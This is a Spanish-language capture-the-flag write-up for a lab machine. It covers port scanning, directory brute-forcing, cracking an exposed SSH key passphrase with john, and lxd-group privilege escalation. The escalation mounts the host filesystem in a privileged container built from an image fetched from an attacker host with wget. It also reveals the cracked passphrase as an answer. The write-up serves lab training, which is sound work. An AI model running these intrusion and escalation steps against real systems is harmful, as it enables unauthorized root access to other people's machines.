Bienvenidos nuevamente. En esta maquina, escanearemos que puertos estan abiertos y enumeraremos directorios ocultos con nuestra herramienta **gobuster**. Tambien realizaremos una busqueda dentro del **Page-Source** para descubrir al usuario que debemos atacar y accederemos remotamente gracias al uso de **id_rsa** con ayuda de **john**. Luego, escalaremos privilegios abusandonos de #lxd para acceder como sisterma raiz.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`
```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.22s latency).
Scanned at 2023-05-02 16:04:56 EDT for 23s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nuestro scan nmap nos muestra los puertos abiertos **http** **ssh**. Podremos navegar dentro de la pagina web e inspeccionar el Page-Source. AL observarlo, podremos leer un mensaje dedicado a john, por lo que, john seria nuestra victima!.

# Enumeration

Empezaremos nuestra enumeracion con la herramienta **gobuster** que nos muestra posibles directorios ocultos. Ejecutaremos `gobuster dir http://IPTARGET -w /usr/share/wordlists/seclist/Discovery/Web-content/common.txt`

```ruby
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 315] [--> http://IPTARGET/secret/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://IPTARGET/uploads/]
```

Tendremos 3 directorios que nos deben interesar:

> /secret
> /robots.txt
> /uploads

Al navegar dentro de /secret, podremos ver una llave que podremos utilizar para acceder via #ssh.

#  Intrusion

Para empezar el proceso de intrusion, copiaremos la llave que obtuvimos anteriormente y le daremos permisos de escritura y lectura : `chmod 600 id_rsa` 
Luego, utilizamos **ssh2john** para descifrar contraseñas de archivos de clave **SSH**. 
Ejecutaremos : `ssh2john id_rsa > id.txt` . Para poder descifrar la contraseña utilizaremos **john** . `sudo john --wordlist=/usr/share/wordlists/rockyou.txt id.txt`

Una vez tengamos nuestra contraseña crackeada, nos conectaremos via #ssh. 
`ssh -i id_rsa john@IPTARGET` nos pedira la contraseña para poder acceder al sistema como usuario john.

# Priv. Escalation

Para escalar privilegios, listaremos informacion sobre el usuario y a los grupos el cual pertenece `id` 
 Veremos que pertenece al grupo #lxd, por lo que haciendo una busqueda en internet sobre este grupo, podemos escalar privilegios de la siguiente manera .

Iniciamos el proceso accediendo como #root en nuestra maquina atacante `sudo su` 
Como usuario root dentro de nuestra maquina atacante, seguismos los siguientes pasos:

> Clonamos el repositorio de git :  `git clone https://github.com/saghul/lxd-alpine-builder.git` y nos dirigimos dentro del directorio.
> Ejecutamos  `./build-alpine` **Este proceso puede demorar**
> Abriremos un servidor http `python3 -m http.server 80`

Cambiamos a la maquina victima, nos moveremos al directorio **/tmp**  y seguiremos los siguientes pasos:

> Nos transferimos el archivo generado por **build-alpine** `wget http://LHOST:80/lxd-build-alpine/alpine-v*.tar.gz` la ruta es dependiendo donde clonaron el repositorio 
> Importaremos `lxc image import ./alpine-v*.tar.gz --alias ggh` el alias es a eleccion.
> Listaremos, asegurando que se importo correctamente `lxc image list`

Una vez seguido los pasos, deberemos configurar nuestro entorno antes de ejecutarlo con los siguientes comandos: 
```ruby
lxc init ggh ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

Corroboramos que somos root con `whoami` . Para encontrar la flag con mas rapidez, podes utilizar `find`

#  Respuestas

#john = letmein


